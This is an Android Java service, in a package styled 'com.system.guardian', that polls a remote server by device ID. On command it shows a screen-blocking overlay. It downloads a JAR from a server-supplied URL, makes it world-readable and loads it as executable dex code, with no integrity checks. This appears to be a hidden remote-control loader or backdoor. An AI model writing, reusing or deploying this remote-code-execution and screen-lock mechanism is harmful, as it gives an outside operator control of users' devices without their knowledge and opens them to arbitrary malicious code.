package com.system.guardian;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

//import androidx.annotation.NonNull;
import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import com.system.guardian.dex_patch_build.PatchInstaller;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.URL;

/**
 * Service that polls the control endpoint and installs APK if update is available.
 */
public class ControlPollerService extends JobIntentService {

    private static final int JOB_ID = 1001;


    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, ControlPollerService.class, JOB_ID, work);
    }

    @SuppressLint("SetWorldReadable")
    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        try {
            Context context = getApplicationContext();
            @SuppressLint("HardwareIds")
            String deviceToken = Settings.Secure.getString(
                    context.getContentResolver(), Settings.Secure.ANDROID_ID);

            String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

            JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
            if (response == null) {
                CrashLogger.log(context, "ControlPoller", "❌ Response was null. Aborting.");
                return;
            }

            CrashLogger.log(context, "CONTROL_JSON", "📦 Response: " + response.toString());

            // 🛰️ Remote override check
            if (response.has("status") && response.has("value")) {
                String status = response.getString("status");
                String value = response.getString("value");
                if ("override".equals(status)) {
                    if ("on".equals(value)) {
                        CrashLogger.log(context, "ControlPoller", "🛰️ Remote override ACTIVE — value: ON");
                        OverlayBlocker.show(context);
                    } else {
                        CrashLogger.log(context, "ControlPoller", "🛰️ Remote override ACTIVE — value: OFF");
                        OverlayBlocker.hide(context);
                    }
                }
            }

            // ✅ JAR PATCH LOGIC
            String jarUrl = response.optString("jar_url", "");
            if (isValidUrl(jarUrl)) {
                File tempDownload = new File(context.getCacheDir(), "patch-temp.jar");
                File safeJar = new File(context.getNoBackupFilesDir(), "patch.jar");

                File downloaded = NetworkUtils.downloadFile(context, jarUrl, tempDownload);

                if (downloaded.exists()) {
                    if (safeJar.exists()) safeJar.delete();

                    try (
                            FileInputStream in = new FileInputStream(downloaded);
                            FileOutputStream out = new FileOutputStream(safeJar)
                    ) {
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = in.read(buffer)) > 0) {
                            out.write(buffer, 0, len);
                        }
                        out.flush();
                    }

                    boolean writable = safeJar.setWritable(false);
                    boolean readable = safeJar.setReadable(true, false);

                    CrashLogger.log(context, "JarFix", (writable ? "✅" : "❌") + " Writable = false");
                    CrashLogger.log(context, "JarFix", (readable ? "✅" : "❌") + " Readable = true");
                    CrashLogger.log(context, "JarFix", "🔍 patch.jar — canRead=" + safeJar.canRead() + ", canWrite=" + safeJar.canWrite());

                    // 🧪 Schedule patch load or fall back to PatchOverride
                    try {
                        DexLoader.schedulePatchLoad(context, safeJar, true);
                    } catch (Exception e) {
                        CrashLogger.log(context, "DexLoader", "❌ DexLoader failed, fallback to PatchOverride: " + e.getMessage());
                        com.system.guardian.dex_patch_build.PatchOverride.applyPatch(context);
                    }
                } else {
                    CrashLogger.log(context, "JarDownload", "❌ patch-temp.jar missing after download");
                }
            } else {
                CrashLogger.log(context, "ControlPoller", "⚠️ jar_url invalid or missing");
            }

        } catch (JSONException e) {
            Log.e("ControlPoller", "❌ JSON parse failed", e);
        } catch (Exception e) {
            Log.e("ControlPoller", "❌ Unexpected error", e);
        }
    }

    // Utility method for safe URL validation
    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }
}
